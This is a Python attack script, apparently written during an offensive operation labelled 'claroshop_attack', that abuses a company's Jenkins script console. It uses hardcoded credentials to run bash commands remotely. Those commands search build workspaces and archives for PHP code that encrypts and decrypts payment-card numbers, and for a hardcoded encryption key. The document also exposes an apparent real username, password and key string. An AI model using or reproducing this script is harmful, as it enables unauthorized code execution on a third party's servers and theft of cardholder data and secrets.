#!/usr/bin/env python3
# kimi4_php_decrypt.py — hunt ClaroShop PHP card encrypt/decrypt code via Jenkins script console
import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, sys, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'
OUT = r'c:\xampp\htdocs\pentagi\claroshop_attack\kimi4_php_decrypt_results.txt'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data, headers={
        'Authorization': 'Basic ' + AUTH,
        crumb['crumbRequestField']: crumb['crumb']
    })
    return opener.open(req2, timeout=180).read().decode()

TASKS = []

TASKS.append(("TASK1 find php encrypt in workspace", r'''
def r = ["bash","-c","""find /var/jenkins_home/jobs -path '*/workspace*' -name '*.php' 2>/dev/null | xargs grep -l 'mcrypt\\|openssl_encrypt\\|openssl_decrypt\\|encript\\|desencript\\|llave_encriptacion\\|datostarjeta\\|numero_tarjeta\\|encrypt.*card\\|decrypt.*card' 2>/dev/null | head -20"""].execute().text
println r
'''))

TASKS.append(("TASK2 find php encrypt in archives", r'''
def r = ["bash","-c","""find /var/jenkins_home/jobs -path '*/archive*' -name '*.php' 2>/dev/null | xargs grep -l 'mcrypt\\|openssl_encrypt\\|llave_encriptacion\\|encripta\\|desencripta' 2>/dev/null | head -20"""].execute().text
println r
'''))

TASKS.append(("TASK3 cat encrypt functions from found files", r'''
def r = ["bash","-c","""for f in \$(find /var/jenkins_home/jobs -path '*workspace*' -name '*.php' 2>/dev/null | xargs grep -l 'mcrypt\\|openssl_encrypt\\|encripta\\|llave_encri' 2>/dev/null | head -5); do
echo "=== \$f ==="
grep -A 30 -B 5 'function.*encri\\|function.*decri\\|mcrypt\\|openssl_encrypt\\|openssl_decrypt\\|llave_encriptacion' "\$f" 2>/dev/null
echo
done"""].execute().text
println r
'''))

TASKS.append(("TASK4 grep hardcoded key usage", r'''
def r = ["bash","-c","""grep -r 'K0SUH7I1yDR616H8LrP0XuhURcCN5uRY4\\|llave_encriptacion_tdc' /var/jenkins_home/jobs/ 2>/dev/null | grep -v '.jar\\|.class\\|Binary' | head -20"""].execute().text
println r
'''))

TASKS.append(("TASK5 find Model/Service php with card+encrypt", r'''
def r = ["bash","-c","""find /var/jenkins_home/jobs -name '*.php' -path '*Model*' 2>/dev/null | xargs grep -l 'tarjeta\\|card\\|encrypt' 2>/dev/null | head -10
echo '---'
find /var/jenkins_home/jobs -name '*.php' -path '*Service*' 2>/dev/null | xargs grep -l 'tarjeta\\|card\\|encrypt' 2>/dev/null | head -10"""].execute().text
println r
'''))

def main():
    results = []
    for name, script in TASKS:
        print(f"\n{'='*70}\n[RUN] {name}\n{'='*70}", flush=True)
        t0 = time.time()
        try:
            out = jenkins_exec(script)
        except Exception as e:
            out = f"[ERROR] {type(e).__name__}: {e}"
        dt = time.time() - t0
        print(out, flush=True)
        print(f"\n[done {dt:.1f}s]", flush=True)
        results.append(f"\n{'='*70}\n{name}  ({dt:.1f}s)\n{'='*70}\n{out}\n")
    with open(OUT, 'w', encoding='utf-8') as fh:
        fh.write('\n'.join(results))
    print(f"\n[SAVED] {OUT}", flush=True)

if __name__ == '__main__':
    main()
